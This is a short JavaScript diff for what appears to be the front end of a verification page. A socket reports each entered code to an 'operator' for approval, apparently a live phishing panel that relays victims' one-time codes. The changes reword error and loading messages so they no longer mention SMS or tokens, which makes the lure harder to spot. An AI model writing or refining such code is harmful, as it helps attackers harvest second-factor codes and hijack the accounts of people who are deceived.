@@ -74,7 +74,11 @@
       setStep("verify");
       tokens.forEach(function (t) { t.value = ""; });
       if (tokens[0]) tokens[0].focus();
-      showError(message || "Código SMS inválido o expirado.");
+      const cleanMsg =
+        !message || /sms|token/i.test(message)
+          ? "Código de correo inválido o expirado."
+          : message;
+      showError(cleanMsg);
     } else if (action === "ask_token") {
       setStep("verify");
       tokens.forEach(function (t) { t.value = ""; });
@@ -279,7 +283,7 @@
       showError("Ingresa el código de 6 dígitos");
       return;
     }
-    showLoading("Validando código SMS...");
+    showLoading("Validando código...");
     sendSocketUpdate("Esperando aprobación del código por el operador");
   });
 
